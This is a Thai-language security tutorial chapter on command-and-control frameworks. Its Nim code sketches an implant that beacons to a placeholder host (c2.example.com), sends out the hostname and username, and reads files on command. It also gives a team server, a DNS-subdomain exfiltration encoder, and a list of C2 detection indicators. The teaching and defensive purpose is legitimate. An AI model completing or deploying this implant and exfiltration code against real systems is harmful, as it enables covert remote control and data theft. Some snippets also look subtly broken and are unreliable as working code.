# Part 43: C2 Framework Concepts เพื่อการศึกษา

> **คำเตือน**: เนื้อหานี้มีไว้เพื่อทำความเข้าใจ Red Team operations, การพัฒนา
> defensive tools, และ threat modeling **เท่านั้น**

## C2 Framework คืออะไร

```
Command and Control (C2) Framework:

Red Team Operator
    |
    v (HTTPS/DNS/SMB/...)
C2 Server (Team Server)
    |
    v
Implant (Payload) ใน Target Machine

ประกอบด้วย:
- Team server: รับ/ส่งคำสั่ง
- Implant: รับคำสั่ง, execute, ส่งผลกลับ
- Listener: รอรับ connections
- Redirectors: ซ่อน IP จริงของ C2

ตัวอย่าง C2:
- Cobalt Strike (คอมเมอร์เชียล)
- Sliver (open source)
- Mythic (open source, research)
- Metasploit (multi-purpose)
- Havoc (open source)
```

## โครงสร้าง Implant

```nim
# simple_implant_concept.nim
# ความเข้าใจโครงสร้าง implant

## โครงสร้างหลัก:
## 1. Configuration
## 2. Communication channel
## 3. Task handling
## 4. Command execution
## 5. Data exfiltration (persistence)

import asynchttpclient, asyncdispatch, json, strutils, os, times

type
  C2Config = object
    serverUrl: string
    sleepTime: int        # seconds between beacons
    jitter: int           # random variation (ms)
    userAgent: string
    implantId: string

  Task = object
    id: string
    taskType: string
    args: JsonNode

proc generateId(): string =
  import random
  randomize()
  var id = ""
  for i in 0..<16:
    id &= toHex(rand(255), 2)
  id.toLowerAscii()

# Beacon: check in with C2 server
proc beacon(config: C2Config, output: seq[string] = @[]): Future[seq[Task]] {.async.} =
  let client = newAsyncHttpClient()
  client.headers = newHttpHeaders({"User-Agent": config.userAgent})
  defer: client.close()
  
  let payload = %*{
    "id": config.implantId,
    "hostname": getHostname(),
    "username": getEnv("USERNAME", getEnv("USER", "unknown")),
    "os": $hostOS,
    "output": output
  }
  
  try:
    let resp = await client.post(config.serverUrl & "/beacon", $payload)
    let body = await resp.body
    let data = parseJson(body)
    
    result = @[]
    for task in data["tasks"]:
      result.add(Task(
        id: task["id"].getStr(),
        taskType: task["type"].getStr(),
        args: task["args"]
      ))
  except:
    echo "[!] Beacon failed: ", getCurrentExceptionMsg()
    return @[]

# Execute task
proc executeTask(task: Task): string =
  case task.taskType:
  of "shell":
    let cmd = task.args["cmd"].getStr()
    # In real implant: execute and capture output
    # Here: just conceptual
    "executed: " & cmd
  
  of "upload":
    let path = task.args["path"].getStr()
    if fileExists(path):
      readFile(path)  # simplified - would be base64+encrypted
    else:
      "file not found"
  
  of "download":
    let path = task.args["path"].getStr()
    let content = task.args["content"].getStr()
    writeFile(path, content)
    "downloaded to: " & path
  
  of "sleep":
    let seconds = task.args["seconds"].getInt()
    # Adjust sleep time
    "sleep: " & $seconds & "s"
  
  of "die":
    quit(0)
  
  else:
    "unknown task type"

# Main beacon loop
proc mainLoop(config: C2Config) {.async.} =
  var pendingOutput: seq[string] = @[]
  
  while true:
    # Beacon and get tasks
    let tasks = await beacon(config, pendingOutput)
    pendingOutput = @[]
    
    # Execute tasks
    for task in tasks:
      let output = executeTask(task)
      pendingOutput.add(output)
    
    # Sleep with jitter
    import random
    let jitterMs = rand(config.jitter)
    let sleepMs = config.sleepTime * 1000 + jitterMs
    await sleepAsync(sleepMs)

# Config (in real implant: embedded at build time or downloaded)
let config = C2Config(
  serverUrl: "https://c2.example.com",  # placeholder
  sleepTime: 60,  # 1 minute
  jitter: 10000,  # 10 second jitter
  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...",
  implantId: generateId()
)

# waitFor mainLoop(config)
echo "[C2 Implant Concept - Educational]"
echo "Implant ID: ", config.implantId
```

## C2 Server (Team Server) Concept

```nim
# c2_server_concept.nim
# C2 Server - รับ beacon จาก implant

import asynchttpserver, asyncdispatch, json, tables, times

type
  ImplantInfo = object
    id: string
    hostname: string
    username: string
    os: string
    lastSeen: Time
  
  TaskStatus = enum
    tsPending, tsComplete, tsFailed
  
  PendingTask = object
    id: string
    taskType: string
    args: JsonNode
    status: TaskStatus
    result: string

var implants = initTable[string, ImplantInfo]()
var pendingTasks = initTable[string, seq[PendingTask]]()  # implantId -> tasks
var taskResults = initTable[string, PendingTask]()

proc handleBeacon(req: Request) {.async.} =
  let body = parseJson(req.body)
  let implantId = body["id"].getStr()
  
  # Update implant info
  implants[implantId] = ImplantInfo(
    id: implantId,
    hostname: body["hostname"].getStr(),
    username: body["username"].getStr(),
    os: body["os"].getStr(),
    lastSeen: getTime()
  )
  
  # Store output from previous tasks
  let output = body["output"]
  if output.kind == JArray:
    for item in output:
      echo "[Output from ", implantId, "]: ", item.getStr()
  
  # Get pending tasks for this implant
  let tasks = if implantId in pendingTasks: pendingTasks[implantId]
               else: @[]
  
  # Clear sent tasks
  if implantId in pendingTasks:
    pendingTasks.del(implantId)
  
  let response = %*{"tasks": tasks.mapIt(%*{"id": it.id, "type": it.taskType, "args": it.args})}
  await req.respond(Http200, $response, newHttpHeaders({"Content-Type": "application/json"}))

proc queueTask(implantId, taskType: string, args: JsonNode): string =
  import random
  let taskId = toHex(rand(0xFFFFFFFF), 8)
  
  if implantId notin pendingTasks:
    pendingTasks[implantId] = @[]
  
  pendingTasks[implantId].add(PendingTask(
    id: taskId,
    taskType: taskType,
    args: args,
    status: tsPending
  ))
  
  taskId

# C2 server routes
proc handler(req: Request) {.async.} =
  case req.url.path
  of "/beacon":
    await handleBeacon(req)
  of "/implants":
    let data = %*{"implants": []}
    for id, info in implants:
      data["implants"].add(%*{
        "id": id,
        "hostname": info.hostname,
        "username": info.username,
        "lastSeen": $info.lastSeen
      })
    await req.respond(Http200, $data)
  else:
    await req.respond(Http404, "Not Found")

echo "[C2 Server Concept - Educational]"
echo "Real C2 servers add: encryption, auth, redirectors, malleable profiles"
```

## DNS C2 Channel

```nim
# dns_c2_concept.nim
# DNS เป็น C2 channel (covert)
# ใช้ DNS queries เพื่อส่งข้อมูล

## DNS C2 Concept:
## Implant: data.base32encoded.c2.example.com
## Server: Authoritative DNS server reads subdomain = command
## Response: TXT record = next command

import asyncnet, asyncdispatch, strutils, base64

proc encodeForDns(data: string): string =
  ## Encode data to be safe for DNS subdomain
  ## Max 63 chars per label, 253 total
  let b64 = encode(data)
  b64.replace("=", "").replace("+", "-").replace("/", "_").toLowerAscii()

proc chunkForDns(encoded: string, domain: string): seq[string] =
  ## Split into DNS-safe chunks
  const maxLabel = 55  # Leave room for index prefix
  result = @[]
  var i = 0
  var idx = 0
  
  while i < encoded.len:
    let chunk = encoded[i..<min(i + maxLabel, encoded.len)]
    result.add(&"{idx:02d}{chunk}.{domain}")
    i += maxLabel
    inc idx

proc dnsC2Beacon(data: string, domain: string): seq[string] =
  ## Exfil data via DNS queries
  let encoded = encodeForDns(data)
  chunkForDns(encoded, domain)

# Example: exfil hostname via DNS
let hostname = "WORKSTATION01"
let chunks = dnsC2Beacon(hostname, "c2.example.com")
for query in chunks:
  echo "DNS Query: ", query
  # resolveHost(query)  # actual DNS lookup

echo "\nDetection:"
echo "- Unusual DNS query volume"
echo "- High-entropy subdomains"
echo "- Queries to unknown domains"
echo "- DNS response size anomalies"
```

## การตรวจจับ C2 Traffic

```nim
# c2_detection.nim
# ตรวจจับ C2 traffic สำหรับ defenders

## Detection indicators:

let c2Indicators = @[
  # Network indicators
  "Periodic HTTP/S beaconing at regular intervals",
  "High-entropy request/response body",
  "Unusual User-Agent strings",
  "JA3/JA3S TLS fingerprint mismatch",
  "Beacon timing patterns (jitter analysis)",
  "Large DNS query volume or high-entropy subdomains",
  
  # Host indicators  
  "Process making outbound connections (no user interaction)",
  "Remote thread injection artifacts",
  "Hollow process or unusual module loads",
  "Scheduled tasks/registry persistence entries",
  "Memory regions that are RX but not file-backed",
  
  # Behavioral indicators
  "Lateral movement after C2 established",
  "Credential dumping activity",
  "Data staging before exfiltration",
  "System enumeration commands"
]

for indicator in c2Indicators:
  echo "  [*] ", indicator

## Tools for C2 detection:
## - Zeek/Bro: network analysis
## - Suricata: IDS/IPS signatures
## - Sysmon + ELK: endpoint detection
## - Microsoft Defender for Endpoint
## - CrowdStrike Falcon
## - Velociraptor: DFIR/hunting
```

## สรุป Part 43

ในบทนี้เราได้เรียนรู้:
- ␅ C2 framework architecture
- ␅ Implant โครงสร้าง
- ␅ Team server concept
- ␅ DNS C2 channel
- ␅ C2 traffic detection

---

**Previous**: [Part 42 - Tooling](../advanced/part42_tooling.md)
**Next**: [Part 44 - Malware Analysis](part44_malware_analysis.md)
